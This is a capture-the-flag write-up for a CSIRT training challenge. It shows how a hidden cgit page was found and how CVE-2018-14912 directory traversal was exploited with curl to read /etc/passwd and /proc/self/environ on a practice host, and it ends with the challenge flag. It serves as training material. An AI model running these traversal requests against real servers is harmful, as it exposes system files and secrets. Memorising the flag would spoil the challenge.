# Chapter 1: Travel

## Challenge

Hi, TCC-CSIRT analyst,

Do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

The entry point to LORE is at http://intro.lore.tcc.

See you in the next incident!

Hint: Be sure you enter the flag for the correct chapter.

## Solution

### 1. Entry Point Discovery

The site for Chapter 1 is located at: http://cgit.lore.tcc/.

Upon inspecting the source code of the site, we found the following commented-out HTML:

```html
<!--
    <p>Manage and browse your source code repositories with CGIT.</p>
    <a href="/cgit.cgi" class="button">Go to Repositories</a>
-->
```

So, we navigated to http://cgit.lore.tcc/cgit.cgi and found two repositories available:

- `foo` – almost empty, with nothing useful.
- `sam-operator` – containing source code for the Chapter 4 challenge.

### 2. Exploiting a Vulnerability in CGIT

After checking for known vulnerabilities in CGIT, we discovered `CVE-2018-14912`, which allows for directory traversal if `enable-http-clone=1` is enabled: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14912

This vulnerability can be exploited using the path traversal technique by appending `?path=../` to the URL, allowing access to sensitive files.

We tested this with the following command to check for Local File Inclusion (LFI):

```bash
curl http://cgit.lore.tcc/cgit.cgi/foo/objects/?path=../../../../../etc/passwd                                                                                                                                  
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Success! The response revealed the contents of `/etc/passwd`, confirming that the vulnerability was present.

### 3. Extracting the Flag from Environment Variables

Since flags are often hidden in environment variables, we decided to check the `/proc/self/environ` file:

```bash
curl -o - http://cgit.lore.tcc/cgit.cgi/foo/objects/?path=../../../../../proc/self/environ
```

## Flag

```
FLAG{FiqE-rPQL-pUV4-daQt}
```
